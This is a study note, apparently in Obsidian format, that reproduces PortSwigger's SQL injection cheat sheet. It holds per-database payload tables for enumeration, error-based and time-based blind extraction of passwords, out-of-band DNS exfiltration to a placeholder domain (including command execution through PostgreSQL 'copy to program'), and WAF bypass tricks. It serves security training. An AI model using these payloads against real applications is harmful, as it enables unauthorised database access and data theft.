---
tags:
  - portswigger
  - sqli
  - cheatsheet
---
> Source : [PortSwigger Web Security Academy - SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# SQL Injection Cheat Sheet

Quick syntax reference across major Database Management Systems (DBMS).

---

## 1. Basic Syntax Differences

| Feature | Oracle | PostgreSQL | MySQL | Microsoft (MSSQL) |
| :--- | :--- | :--- | :--- | :--- |
| **String Concat** | `'a'\|\|'b'` | `'a'\|\|'b'` | `CONCAT('a','b')` / `'a' 'b'` | `'a'+'b'` |
| **Substring** | `SUBSTR('str', 1, 1)` | `SUBSTRING('str', 1, 1)` / `SUBSTR` | `SUBSTRING('str', 1, 1)` | `SUBSTRING('str', 1, 1)` |
| **Comments** | `--comment` | `--comment` / `/*...*/` | `#comment` / `-- comment` *(trailing space required)* | `--comment` / `/*...*/` |
| **Dummy Table** | `FROM dual` *(Required)* | Not required | Not required | Not required |
| **Stacked Queries** | Not supported | `query1; query2` | Limited (driver-dependent) | `query1; query2` |

---

## 2. Database Enumeration

| Target Info | Oracle | PostgreSQL | MySQL | Microsoft (MSSQL) |
| :--- | :--- | :--- | :--- | :--- |
| **DB Version** | `SELECT banner FROM v$version` | `SELECT version()` | `SELECT @@version` | `SELECT @@version` |
| **List Tables** | `SELECT table_name FROM all_tables` | `SELECT table_name FROM information_schema.tables` | `SELECT table_name FROM information_schema.tables` | `SELECT table_name FROM information_schema.tables` |
| **List Columns** | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |

---

## 3. Conditional Errors (HTTP 500 Trigger)

| DBMS | Syntax |
| :--- | :--- |
| **Oracle** | `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)` |
| **MSSQL** | `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END` |
| **MySQL** | `SELECT IF(COND, (SELECT table_name FROM information_schema.tables), 'a')` |

---

## 4. Visible Error Extraction

| DBMS | Syntax |
| :--- | :--- |
| **PostgreSQL** | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` |
| **MSSQL** | `SELECT 'a' WHERE 1 = (SELECT password FROM users)` |
| **MySQL** | `AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)))` |

---

## 5. Time Delays (Unconditional & Conditional)

| DBMS | Unconditional (10s) | Conditional |
| :--- | :--- | :--- |
| **PostgreSQL** | `SELECT pg_sleep(10)` | `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MSSQL** | `WAITFOR DELAY '0:0:10'` | `IF (COND) WAITFOR DELAY '0:0:10'` |
| **MySQL** | `SELECT SLEEP(10)` | `SELECT IF(COND, SLEEP(10), 'a')` |
| **Oracle** | `dbms_pipe.receive_message(('a'),10)` | `SELECT CASE WHEN (COND) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |

---

## 6. Out-of-Band (OAST / DNS Lookup)

| DBMS | DNS Lookup Payload |
| :--- | :--- |
| **Oracle (XXE)** | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://DOMAIN/"> %remote;]>'),'/l') FROM dual` |
| **Oracle (Priv)** | `SELECT UTL_INADDR.get_host_address('DOMAIN')` |
| **MSSQL** | `EXEC master..xp_dirtree '//DOMAIN/a'` |
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup DOMAIN'` |
| **MySQL (Win)** | `LOAD_FILE('\\\\DOMAIN\\a')` |

---

## 7. Filter / WAF Bypass Tricks

* **Case Variation:** `SeLeCt`, `uNiOn`
* **Inline Comments (space replacement):** `SELECT/**/username/**/FROM/**/users`
* **MySQL Versioned Comments:** `/*!SELECT*/`
* **XML Entities (inside XML payloads):** `&#x53;ELECT`
* **URL Encoding (in HTTP headers/URLs):** Space (`+` / `%20`), `#` (`%23`), `;` (`%3b`), `%` (`%25`).

---

## Related Notes
* [[00 - SQLi Overview & Mindset]]
* [[01 - UNION Attacks & DB Enumeration]]
* [[02 - Blind SQLi Techniques]]
